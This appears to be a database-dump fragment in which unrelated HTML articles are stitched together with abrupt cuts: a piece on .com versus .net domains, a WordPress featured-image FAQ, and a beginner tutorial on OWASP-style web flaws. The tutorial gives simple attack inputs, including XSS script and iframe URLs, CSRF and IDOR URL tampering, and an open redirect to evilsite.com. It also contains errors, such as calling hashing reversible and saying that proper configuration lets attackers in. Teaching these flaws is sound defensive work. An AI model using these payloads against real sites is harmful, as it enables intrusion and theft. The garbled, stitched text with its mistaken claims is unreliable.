keeping the .net domain name registered for technical and legal reasons.</p>\n\n<p>Choosing .Com vs .Net &ndash; Which One is Better for SEO?</p>\n\n<p><img alt=\"SEO - search engine optimization - in letters\" src=\"https://www.wpbeginner.com/wp-content/uploads/2020/04/seo-search-engine-optimization.jpg\" style=\"height:327px; width:550px\" /></p>\n\n<p>A lot of our users ask us which domain extension will help them rank higher.</p>\n\n<p>If you&rsquo;re looking at either .com or .net, it doesn&rsquo;t make any difference which you choose from an SEO perspective. Search engines will treat both domain extensions the same.</p>\n\n<p>Just focus on&nbsp;<a href=\"https://www.wpbeginner.com/wordpress-seo/\">SEO best practices</a>&nbsp;and create useful targeted content to rank higher.</p>\n\n<p>The important part is your domain name itself, not the extension.</p>\n\n<p>For example,&nbsp;<em>stargardeningservices.com</em>&nbsp;will rank better than&nbsp;<em>starservices.net</em>&nbsp;because it contains a keyword (gardening services) that people are likely to search for.</p>\n\n<p>How to Buy a Domain Name</p>\n\n<p>There are two ways to get a domain name. You can choose the one that best suits you.</p>\n\n<p><strong>1. Get a FREE Domain Name with Bluehost</strong></p>\n\n<p>To make a website, you need website hosting as well as a domain name.</p>\n\n<p>This may seem a bit confusing when you&rsquo;re new to creating websites.

Following are just some of the most frequently asked questions about featured images.</p>\n\n<p><strong>1. Why featured image is appearing twice on my posts?</strong></p>\n\n<p>Sometimes beginner add a featured image and then add the same image inside the content part of the post editor.</p>\n\n<p>All you have to do is remove the image from the content area and only use featured image metabox to add featured image. For more on this topic, see our article on&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/how-to-fix-featured-images-appearing-twice-in-wordpress-posts/\">how to fix featured image appearing twice in WordPress</a>.</p>\n\n<p><strong>2. What is the difference between the cover image and featured image?</strong></p>\n\n<p>Cover images are used in the content area of your posts or pages. They are normally used to separate different sections of a lengthy page or post.</p>\n\n<p>Featured image is the representative image of an article. It does appear before or alongside the content but not inside the actual article.</p>\n\n<p>For more on this topic, see our guide on the&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/cover-image-vs-featured-image-in-wordpress/\">difference between cover image and featured image in WordPress</a>.</p>\n\n<p><strong>3. How to display featured images next to recent blog posts?</strong></p>\n\n<p>The WordPress block editor comes with a &lsquo;Latest Posts&rsquo; block which allows you to display recent posts with post thumbnails.</p>\n\n<p>You can also display recent posts with thumbnails in sidebar widgets using&nbsp;<a href=\"https://wordpress.org/plugins/recent-posts-widget-extended/\" target=\"_blank\">Recent Posts Widget Extended</a>&nbsp;plugin. For more details, see our article on&nbsp;<a href=\"https://www.wpbeginner.com/wp-tutorials/how-to-display-recent-posts-in-wordpress/\">how to display recent posts in WordPress</a>.</p>\n\n<p><strong>4. How to remind authors to add featured image in WordPress?</strong></p>\n\n<p>Featured images are prominently displayed on your homepage, blog page, and other archive pages.</p>\n\n<p>If you or another author on your blog forgot to set one and published the post then it will appear without a featured image. This will look bad and inconsistent, which is not good for user experience.</p>\n\n<p>You can install and activate the&nbsp;<a href=\"http://wordpress.org/plugins/require-featured-image/\" target=\"_blank\">Require Featured Image</a>&nbsp;plugin, which will show a notification when anyone tries to publish a post without featured image.</p>\n\n<p><img alt=\"Require featured image\" src=\"https://www.wpbeginner.com/wp-content/uploads/2020/04/requirefeaturedimage-1.png\" style=\"height:314px; width:550px\" /></p>\n\n<p>For more details, see our article on&nbsp;<a href=\"https://www.wpbeginner.com/plugins/require-featured-images-posts-wordpress/\">how to require featured images in WordPress</a>.</p>\n\n<p>We hope that this article helped you learn how to add featured images or post thumbnails in WordPress.

These flaws can occur when the application takes untrusted data and send it to the web browser without proper validation.</p>\n\n<p>Attackers can use XSS to execute malicious scripts on the users in this case victim browsers. Since the browser cannot know if the script is trusty or not, the script will be executed, and the attacker can hijack session cookies, deface websites, or redirect the user to an unwanted and malicious websites.</p>\n\n<p>XSS is an attack which allows the attacker to execute the scripts on the victim&rsquo;s browser.</p>\n\n<p><strong>Implication:</strong></p>\n\n<ul>\n	<li>Making the use of this security vulnerability, an attacker can inject scripts into the application, can steal session cookies, deface websites, and can run malware on the victim&rsquo;s machines.</li>\n</ul>\n\n<p><strong>Vulnerable Objects</strong></p>\n\n<ul>\n	<li>Input Fields</li>\n	<li>URLs</li>\n</ul>\n\n<p><strong>Examples</strong></p>\n\n<p>1.&nbsp;<strong>http://www.vulnerablesite.com/home?&rdquo;&lt;script&gt;alert(&ldquo;xss&rdquo;)&lt;/script</strong>&gt;</p>\n\n<p>The above script when run on a browser, a message box will be displayed if the site is vulnerable to XSS.</p>\n\n<p>The more serious attack can be done if the attacker wants to display or store session cookie.</p>\n\n<p>2.&nbsp;<strong>http://demo.testfire.net/search.aspx?txtSearch &lt;iframe</strong>&gt; &lt;src =&nbsp;<strong>http://google.com</strong>&nbsp;width = 500 height 500&gt;&lt;/iframe&gt;</p>\n\n<p>The above script when run, the browser will load an invisible frame pointing to&nbsp;<strong>http://google.com</strong>.</p>\n\n<p>The attack can be made serious by running a malicious script on the browser.</p>\n\n<p><strong>Recommendations</strong></p>\n\n<ol>\n	<li>White Listing input fields</li>\n	<li>Input Output encoding</li>\n</ol>\n\n<h2>Broken Authentication and Session Management</h2>\n\n<p><strong>Description</strong></p>\n\n<p>The websites usually create a session cookie and session ID for each valid session, and these cookies contain sensitive data like username, password, etc. When the session is ended either by logout or browser closed abruptly, these cookies should be invalidated i.e. for each session there should be a new cookie.</p>\n\n<p>If the cookies are not invalidated, the sensitive data will exist in the system. For example, a user using a public computer (Cyber Cafe), the cookies of the vulnerable site sits on the system and exposed to an attacker. An attacker uses the same public computer after some time, the sensitive data is compromised.</p>\n\n<p>In the same manner, a user using a public computer, instead of logging off, he closes the browser abruptly. An attacker uses the same system, when browses the same vulnerable site, the previous session of the victim will be opened. The attacker can do whatever he wants to do from stealing profile information, credit card information, etc.</p>\n\n<p>A check should be done to find the strength of the authentication and session management. Keys, session tokens, cookies should be implemented properly without compromising passwords.</p>\n\n<p><strong>Vulnerable Objects</strong></p>\n\n<ul>\n	<li>Session IDs exposed on URL can lead to session fixation attack.</li>\n	<li>Session IDs same before and after logout and login.</li>\n	<li>Session Timeouts are not implemented correctly.</li>\n	<li>Application is assigning same session ID for each new session.</li>\n	<li>Authenticated parts of the application are protected using SSL and passwords are stored in hashed or encrypted format.</li>\n	<li>The session can be reused by a low privileged user.</li>\n</ul>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>Making use of this vulnerability, an attacker can hijack a session, gain unauthorized access to the system which allows disclosure and modification of unauthorized information.</li>\n	<li>The sessions can be high jacked using stolen cookies or sessions using XSS.</li>\n</ul>\n\n<p><strong>Examples</strong></p>\n\n<ol>\n	<li>Airline reservation application supports URL rewriting, putting session IDs in the URL:\n	<p><strong>http://Examples.com/sale/saleitems;jsessionid=2P0OC2oJM0DPXSNQPLME34SERTBG/dest=Maldives</strong>&nbsp;(Sale of tickets to Maldives)</p>\n\n	<p>An authenticated user of the site wants to let his friends know about the sale and sends an email across. The friends receive the session ID and can be used to do unauthorized modifications or misuse the saved credit card details.</p>\n	</li>\n	<li>An application is vulnerable to XSS, by which an attacker can access the session ID and can be used to hijack the session.</li>\n	<li>Applications timeouts are not set properly. The user uses a public computer and closes the browser instead of logging off and walks away. The attacker uses the same browser some time later, and the session is authenticated.</li>\n</ol>\n\n<p><strong>Recommendations</strong></p>\n\n<ol>\n	<li>All the authentication and session management requirements should be defined as per OWASP Application Security Verification Standard.</li>\n	<li>Never expose any credentials in URLs or Logs.</li>\n	<li>Strong efforts should be also made to avoid XSS flaws which can be used to steal session IDs.</li>\n</ol>\n\n<h2>Insecure Direct Object References</h2>\n\n<p><strong>Description</strong></p>\n\n<p>It occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key as in URL or as a FORM parameter. The attacker can use this information to access other objects and can create a future attack to access the unauthorized data.</p>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>Using this vulnerability, an attacker can gain access to unauthorized internal objects, can modify data or compromise the application.</li>\n</ul>\n\n<p><strong>Vulnerable Objects</strong></p>\n\n<ul>\n	<li>In the URL.</li>\n</ul>\n\n<p><strong>Examples:</strong></p>\n\n<p>Changing &ldquo;userid&rdquo; in the following URL can make an attacker to view other user&rsquo;s information.</p>\n\n<p><strong>http://www.vulnerablesite.com/userid=123</strong>&nbsp;Modified to&nbsp;<strong>http://www.vulnerablesite.com/userid=124</strong></p>\n\n<p>An attacker can view others information by changing user id value.</p>\n\n<p><strong>Recommendations:</strong></p>\n\n<ol>\n	<li>Implement access control checks.</li>\n	<li>Avoid exposing object references in URLs.</li>\n	<li>Verify authorization to all reference objects.</li>\n</ol>\n\n<h2>Cross Site Request Forgery</h2>\n\n<p><strong>Description</strong></p>\n\n<p>Cross Site Request Forgery is a forged request came from the cross site.</p>\n\n<p>CSRF attack is an attack that occurs when a malicious website, email, or program causes a user&rsquo;s browser to perform an unwanted action on a trusted site for which the user is currently authenticated.</p>\n\n<p>A CSRF attack forces a logged-on victim&rsquo;s browser to send a forged HTTP request, including the victim&rsquo;s session cookie and any other automatically included authentication information, to a vulnerable web application.</p>\n\n<p>A link will be sent by the attacker to the victim when the user clicks on the URL when logged into the original website, the data will be stolen from the website.</p>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>Using this vulnerability as an attacker can change user profile information, change status, create a new user on admin behalf, etc.</li>\n</ul>\n\n<p><strong>Vulnerable Objects</strong></p>\n\n<ul>\n	<li>User Profile page</li>\n	<li>User account forms</li>\n	<li>Business transaction page</li>\n</ul>\n\n<p><strong>Examples</strong></p>\n\n<p>The victim is logged into a bank website using valid credentials. He receives mail from an attacker saying &ldquo;Please click here to donate $1 to cause.&rdquo;</p>\n\n<p>When the victim clicks on it, a valid request will be created to donate $1 to a particular account.</p>\n\n<p><strong>http://www.vulnerablebank.com/transfer.do?account=cause&amp;amount=1</strong></p>\n\n<p>The attacker captures this request and creates below request and embeds in a button saying &ldquo;I Support Cause.&rdquo;</p>\n\n<p><strong>http://www.vulnerablebank.com/transfer.do?account=Attacker&amp;amount=1000</strong></p>\n\n<p>Since the session is authenticated and the request is coming through the bank website, the server would transfer $1000 dollars to the attacker.</p>\n\n<p><strong>Recommendation</strong></p>\n\n<ol>\n	<li>Mandate user&rsquo;s presence while performing sensitive actions.</li>\n	<li>Implement mechanisms like CAPTCHA, Re-Authentication, and Unique Request Tokens.</li>\n</ol>\n\n<h2>Security Misconfiguration</h2>\n\n<p><strong>Description</strong></p>\n\n<p>Security Configuration must be defined and deployed for the application, frameworks, application server, web server, database server, and platform. If these are properly configured, an attacker can have unauthorized access to sensitive data or functionality.</p>\n\n<p>Sometimes such flaws result in complete system compromise. Keeping the software up to date is also good security.</p>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>Making use of this vulnerability, the attacker can enumerate the underlying technology and application server version information, database information and gain information about the application to mount few more attacks.</li>\n</ul>\n\n<p><strong>Vulnerable objects</strong></p>\n\n<ul>\n	<li>URL</li>\n	<li>Form Fields</li>\n	<li>Input fields</li>\n</ul>\n\n<p><strong>Examples</strong></p>\n\n<ol>\n	<li>The application server admin console is automatically installed and not removed.

Attacker discovers and can simply list directories to find any file.</li>\n</ol>\n\n<p><strong>Recommendations</strong></p>\n\n<ol>\n	<li>A strong application architecture that provides good separation and security between the components.</li>\n	<li>Change default usernames and passwords.</li>\n	<li>Disable directory listings and implement access control checks.</li>\n</ol>\n\n<h2>Insecure Cryptographic Storage</h2>\n\n<p><strong>Description</strong></p>\n\n<p>Insecure Cryptographic storage is a common vulnerability which exists when the sensitive data is not stored securely.</p>\n\n<p>The user credentials, profile information, health details, credit card information, etc. come under sensitive data information on a website.</p>\n\n<p>This data will be stored on the application database. When this data are stored improperly by not using encryption or hashing*, it will be vulnerable to the attackers.</p>\n\n<p>(*Hashing is transformation of the string characters into shorter strings of fixed length or a key. To decrypt the string, the algorithm used to form the key should be available)</p>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>By using this vulnerability, an attacker can steal, modify such weakly protected data to conduct identity theft, credit card fraud or other crimes.</li>\n</ul>\n\n<p><strong>Vulnerable objects</strong></p>\n\n<ul>\n	<li>Application database.</li>\n</ul>\n\n<p><strong>Examples</strong></p>\n\n<p>In one of the banking application, password database uses unsalted hashes * to store everyone&rsquo;s passwords. An SQL injection flaw allows the attacker to retrieve the password file. All the unsalted hashes can be brute forced in no time whereas, the salted passwords would take thousands of years.</p>\n\n<p>(*Unsalted Hashes &ndash; Salt is a random data appended to the original data. Salt is appended to the password before hashing)</p>\n\n<p><strong>Recommendations</strong></p>\n\n<ol>\n	<li>Ensure appropriate strong standard algorithms. Do not create own cryptographic algorithms. Use only approved public algorithms such as AES, RSA public key cryptography, and SHA-256, etc.</li>\n	<li>Ensure offsite backups are encrypted, but the keys are managed and backed up separately.</li>\n</ol>\n\n<h2>Failure to restrict URL Access</h2>\n\n<p><strong>Description</strong></p>\n\n<p>Web applications check URL access rights before rendering protected links and buttons. Applications need to perform similar access control checks each time these pages are accessed.</p>\n\n<p>In most of the applications, the privileged pages, locations and resources are not presented to the privileged users.</p>\n\n<p>By an intelligent guess, an attacker can access privilege pages. An attacker can access sensitive pages, invoke functions and view confidential information.</p>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>Making use of this vulnerability attacker can gain access to the unauthorized URLs, without logging into the application and exploit the vulnerability. An attacker can access sensitive pages, invoke functions and view confidential information.</li>\n</ul>\n\n<p><strong>Vulnerable objects:</strong></p>\n\n<ul>\n	<li>URLs</li>\n</ul>\n\n<p><strong>Examples</strong></p>\n\n<ol>\n	<li>Attacker notices the URL indicates the role as &ldquo;/user/getaccounts.&rdquo; He modifies as &ldquo;/admin/getaccounts&rdquo;.</li>\n	<li>An attacker can append role to the URL.</li>\n</ol>\n\n<p><strong>http://www.vulnerablsite.com</strong>&nbsp;can be modified as&nbsp;<strong>http://www.vulnerablesite.com/admin</strong></p>\n\n<p><strong>Recommendations</strong></p>\n\n<ol>\n	<li>Implement strong access control checks.</li>\n	<li>Authentication and authorization policies should be role-based.</li>\n	<li>Restrict access to unwanted URLs.</li>\n</ol>\n\n<h2>Insufficient Transport Layer Protection</h2>\n\n<p><strong>Description</strong></p>\n\n<p>Deals with information exchange between the user (client) and the server (application). Applications frequently transmit sensitive information like authentication details, credit card information, and session tokens over a network.</p>\n\n<p>By using weak algorithms or using expired or invalid certificates or not using SSL can allow the communication to be exposed to untrusted users, which may compromise a web application and or steal sensitive information.</p>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>Making use of this web security vulnerability, an attacker can sniff legitimate user&rsquo;s credentials and gaining access to the application.</li>\n	<li>Can steal credit card information.</li>\n</ul>\n\n<p><strong>Vulnerable objects</strong></p>\n\n<ul>\n	<li>Data sent over the network.</li>\n</ul>\n\n<p><strong>Recommendations</strong></p>\n\n<ol>\n	<li>Enable secure HTTP and enforce credential transfer over HTTPS only.</li>\n	<li>Ensure your certificate is valid and not expired.</li>\n</ol>\n\n<p><strong>Examples:</strong></p>\n\n<p>1. An application not using SSL, an attacker will simply monitor network traffic and observes an authenticated victim session cookie. An attacker can steal that cookie and perform Man-in-the-Middle attack.</p>\n\n<h2>Unvalidated Redirects and Forwards</h2>\n\n<p><strong>Description</strong></p>\n\n<p>The web application uses few methods to redirect and forward users to other pages for an intended purpose.</p>\n\n<p>If there is no proper validation while redirecting to other pages, attackers can make use of this and can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages.</p>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>An attacker can send a URL to the user that contains a genuine URL appended with encoded malicious URL. A user by just seeing the genuine part of the attacker sent URL can browse it and may become a victim.</li>\n</ul>\n\n<p><strong>Examples</strong></p>\n\n<p>1.<strong>http://www.vulnerablesite.com/login.aspx?redirectURL=ownsite.com</strong></p>\n\n<p>Modified to</p>\n\n<p><strong>http://www.vulnerablesite.com/login.aspx?redirectURL=evilsite.com</strong></p>\n\n<p><strong>Recommendations</strong></p>\n\n<ol>\n	<li>Simply avoid using redirects and forwards in the application. If used, do not involve using user parameters in calculating the destination.</li>\n	<li>If the destination parameters can&rsquo;t be avoided, ensure that the supplied value is valid, and authorized for the user.</li>\n</ol>', '1633175462.jpg', 5, 'Published');
